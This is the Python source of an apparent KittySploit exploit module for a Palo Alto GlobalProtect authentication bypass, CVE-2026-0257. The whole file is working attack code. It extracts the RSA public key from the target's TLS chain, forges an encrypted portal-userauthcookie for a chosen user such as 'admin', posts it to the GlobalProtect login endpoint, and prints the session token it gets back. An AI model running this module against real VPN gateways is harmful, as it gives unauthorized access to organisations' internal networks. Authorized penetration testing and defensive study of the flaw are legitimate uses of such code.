#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import re
import socket
import ssl
import time
from typing import List, Optional, Tuple

from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Palo Alto GlobalProtect CVE-2026-0257 auth override bypass",
        "description": (
            "CVE-2026-0257: when GlobalProtect authentication override cookies are enabled "
            "and the encryption certificate is exposed via the HTTPS service, an attacker can "
            "retrieve the public key from the TLS chain and forge portal-userauthcookie values "
            "to bypass authentication on the portal or gateway."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-0257"],
        "references": [
            "https://security.paloaltonetworks.com/CVE-2026-0257",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-0257",
        ],
        "tags": [
            "paloalto",
            "pan-os",
            "globalprotect",
            "vpn",
            "auth-bypass",
            "cookie",
            "cwe-287",
            "cve-2026-0257",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.5,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["globalprotect", "paloalto", "pan-os"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/ssl-vpn/login.esp", "/global-protect/"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "globalprotect_cookie"},
                    {"capability": "vpn_access", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    _DEFAULT_LOGIN_PATH = "/ssl-vpn/login.esp"

    port = OptPort(443, "GlobalProtect HTTPS port", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)
    login_path = OptString(
        _DEFAULT_LOGIN_PATH,
        "GlobalProtect login endpoint path",
        required=False,
    )
    username = OptString("admin", "Username to forge in the auth override cookie", required=False)
    domain = OptString("", "Domain field for the forged cookie", required=False)
    host_id = OptString("", "Host ID field for the forged cookie", required=False)
    client_os = OptString("Windows", "Client OS field for the forged cookie", required=False)
    client_ip = OptString("0.0.0.0", "Client IP embedded in the forged cookie", required=False)
    context = OptChoice(
        "both",
        "Endpoint context to validate against",
        required=False,
        choices=["gateway", "portal", "both"],
    )
    verbose = OptBool(False, "Print full endpoint responses", required=False, advanced=True)

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _host_label(self) -> str:
        return self._opt(self.target)

    def _login_path(self) -> str:
        path = self._opt(self.login_path) or self._DEFAULT_LOGIN_PATH
        if not path.startswith("/"):
            path = "/" + path
        return path

    def _contexts(self) -> List[str]:
        selected = self._opt(self.context) or "both"
        if selected == "both":
            return ["gateway", "portal"]
        return [selected]

    def _parse_certs_from_tls_records(self, data: bytes) -> List[x509.Certificate]:
        handshake_data = bytearray()
        index = 0
        while index + 5 <= len(data):
            content_type = data[index]
            record_length = int.from_bytes(data[index + 3:index + 5], "big")
            if index + 5 + record_length > len(data):
                break
            if content_type == 22:
                handshake_data.extend(data[index + 5:index + 5 + record_length])
            index += 5 + record_length

        certs: List[x509.Certificate] = []
        offset = 0
        while offset + 4 <= len(handshake_data):
            hs_type = handshake_data[offset]
            hs_length = int.from_bytes(handshake_data[offset + 1:offset + 4], "big")
            if offset + 4 + hs_length > len(handshake_data):
                break
            if hs_type == 11:
                body = handshake_data[offset + 4:offset + 4 + hs_length]
                if len(body) >= 3:
                    certs_total_len = int.from_bytes(body[0:3], "big")
                    cursor = 3
                    while cursor + 3 <= len(body) and cursor < 3 + certs_total_len:
                        cert_len = int.from_bytes(body[cursor:cursor + 3], "big")
                        if cursor + 3 + cert_len > len(body):
                            break
                        cert_der = bytes(body[cursor + 3:cursor + 3 + cert_len])
                        certs.append(x509.load_der_x509_certificate(cert_der))
                        cursor += 3 + cert_len
                break
            offset += 4 + hs_length
        return certs

    def _extract_certs_from_tls_handshake(
        self,
        host: str,
        port: int,
        timeout: float,
    ) -> List[x509.Certificate]:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        if hasattr(ssl, "TLSVersion"):
            context.maximum_version = ssl.TLSVersion.TLSv1_2

        incoming = ssl.MemoryBIO()
        outgoing = ssl.MemoryBIO()
        sslobj = context.wrap_bio(incoming, outgoing, server_hostname=host)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        raw_from_server = bytearray()
        try:
            while True:
                out_data = outgoing.read()
                if out_data:
                    sock.sendall(out_data)
                try:
                    sslobj.do_handshake()
                    out_data = outgoing.read()
                    if out_data:
                        sock.sendall(out_data)
                    break
                except ssl.SSLWantReadError:
                    pass
                except ssl.SSLWantWriteError:
                    continue

                sock.setblocking(False)
                try:
                    chunk = sock.recv(16384)
                    if not chunk:
                        break
                    raw_from_server.extend(chunk)
                    incoming.write(chunk)
                except (BlockingIOError, OSError):
                    sock.setblocking(True)
                    sock.settimeout(timeout)
                    out_data = outgoing.read()
                    if out_data:
                        sock.sendall(out_data)
                    chunk = sock.recv(16384)
                    if not chunk:
                        break
                    raw_from_server.extend(chunk)
                    incoming.write(chunk)
                finally:
                    sock.setblocking(True)
                    sock.settimeout(timeout)
        except (ssl.SSLError, socket.timeout, OSError):
            pass
        finally:
            sock.close()

        return self._parse_certs_from_tls_records(bytes(raw_from_server))

    def _fetch_tls_certificate_chain(self, host: str, port: int, timeout: float) -> List[x509.Certificate]:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with context.wrap_socket(socket.socket(), server_hostname=host) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            if hasattr(sock, "get_unverified_chain"):
                der_chain = sock.get_unverified_chain()
                if der_chain:
                    return [x509.load_der_x509_certificate(der) for der in der_chain]

        certs = self._extract_certs_from_tls_handshake(host, port, timeout)
        if certs:
            return certs

        with context.wrap_socket(socket.socket(), server_hostname=host) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            der_bytes = sock.getpeercert(binary_form=True)
        if not der_bytes:
            return []
        return [x509.load_der_x509_certificate(der_bytes)]

    def _rsa_public_keys_from_chain(
        self,
        certs: List[x509.Certificate],
    ) -> List[Tuple[int, str, RSAPublicKey]]:
        keys: List[Tuple[int, str, RSAPublicKey]] = []
        for index, cert in enumerate(certs):
            public_key = cert.public_key()
            if isinstance(public_key, RSAPublicKey):
                keys.append((index, cert.subject.rfc4514_string(), public_key))
        return keys

    def _forge_auth_override_cookie(self, public_key: RSAPublicKey, username: str) -> str:
        timestamp = int(time.time())
        plaintext = (
            f"{username};{self._opt(self.domain)};{self._opt(self.client_os) or 'Windows'};"
            f"{self._opt(self.host_id)};{timestamp};{self._opt(self.client_ip) or '0.0.0.0'}"
        )
        ciphertext = public_key.encrypt(plaintext.encode(), padding.PKCS1v15())
        return base64.b64encode(ciphertext).decode()

    def _build_login_form(self, cookie_b64: str, context_name: str) -> dict:
        return {
            "prot": "https",
            "server": self._host_label(),
            "inputStr": "",
            "jnlpReady": "jnlpReady",
            "ok": "Login",
            "direct": "yes",
            "clientVer": "4100",
            "user": self._opt(self.username) or "admin",
            "passwd": "",
            "context": context_name,
            "clientos": self._opt(self.client_os) or "Windows",
            "clientgpversion": "6.0.0",
            "host-id": self._opt(self.host_id),
            "computer": "",
            "os-version": "Microsoft Windows 10 Pro 64-bit",
            "portal-userauthcookie": cookie_b64,
            "portal-prelogonuserauthcookie": "",
        }

    def _gateway_cookie_accepted(self, response_text: str, username: str) -> bool:
        text = response_text or ""
        return "<status>Success</status>" in text or (
            "<argument>" in text and username in text
        )

    def _portal_cookie_accepted(self, response_text: str, username: str) -> bool:
        text = response_text or ""
        return "<argument>" in text and username in text

    def _parse_portal_arguments(self, response_text: str) -> List[str]:
        return re.findall(r"<argument>(.*?)</argument>", response_text or "", re.I | re.S)

    def _fetch_chain(self) -> List[Tuple[int, str, RSAPublicKey]]:
        host = self._host_label()
        if not host:
            return []
        timeout = max(float(self.timeout or 10), 10.0)
        certs = self._fetch_tls_certificate_chain(host, int(self.port), timeout=timeout)
        return self._rsa_public_keys_from_chain(certs)

    def _post_login(self, cookie_b64: str, context_name: str) -> Tuple[Optional[object], str]:
        response = self.http_request(
            method="POST",
            path=self._login_path(),
            data=self._build_login_form(cookie_b64, context_name),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=max(int(self.timeout or 15), 15),
            allow_redirects=True,
        )
        if not response:
            return None, ""
        return response, response.text or ""

    def _try_keys(self, announce_chain: bool = False) -> Tuple[bool, str, str, str]:
        keys = self._fetch_chain()
        if not keys:
            return False, "", "", "Could not retrieve TLS certificate chain"

        if announce_chain:
            print_success(f"Found {len(keys)} RSA certificate(s) in chain")
            for index, subject, public_key in keys:
                print_info(f"  [{index}] {subject} ({public_key.key_size} bits)")

        username = self._opt(self.username) or "admin"
        for index, subject, public_key in keys:
            print_status(f"Trying certificate [{index}] {subject}")
            cookie_b64 = self._forge_auth_override_cookie(public_key, username)
            for context_name in self._contexts():
                response, body = self._post_login(cookie_b64, context_name)
                if not response:
                    continue

                if context_name == "gateway":
                    accepted = self._gateway_cookie_accepted(body, username)
                else:
                    accepted = self._portal_cookie_accepted(body, username)

                if bool(self.verbose):
                    print_info(f"{context_name} response ({response.status_code}):\n{body[:4000]}")

                if accepted:
                    detail = f"{context_name} accepted forged cookie from chain index {index}"
                    return True, cookie_b64, context_name, detail

                print_warning(f"{context_name} rejected cookie from certificate [{index}]")

        return False, "", "", "No certificate in the TLS chain produced an accepted cookie"

    def check(self):
        host = self._host_label()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}

        ok, cookie_b64, context_name, reason = self._try_keys()
        return {
            "vulnerable": ok,
            "reason": reason,
            "confidence": "high" if ok else "medium",
            "cookie": cookie_b64 or None,
            "context": context_name or None,
        }

    def run(self):
        host = self._host_label()
        if not host:
            print_error("Target host is required")
            return False

        print_status(f"Retrieving TLS certificate chain from {host}:{int(self.port)}")
        ok, cookie_b64, context_name, reason = self._try_keys(announce_chain=True)
        if not ok:
            print_error(reason)
            return False

        username = self._opt(self.username) or "admin"
        print_success(reason)
        print_success(f"Forged cookie ({context_name}): {cookie_b64}")

        _, body = self._post_login(cookie_b64, context_name)
        if context_name == "portal":
            args = self._parse_portal_arguments(body)
            if len(args) > 1:
                print_info(f"Auth token: {args[1]}")
            if len(args) > 4:
                print_info(f"Username:   {args[4]}")
            if len(args) > 3:
                print_info(f"Gateway:    {args[3]}")

        print_info(f"Replay with user={username} and portal-userauthcookie on {self._login_path()}")
        return True
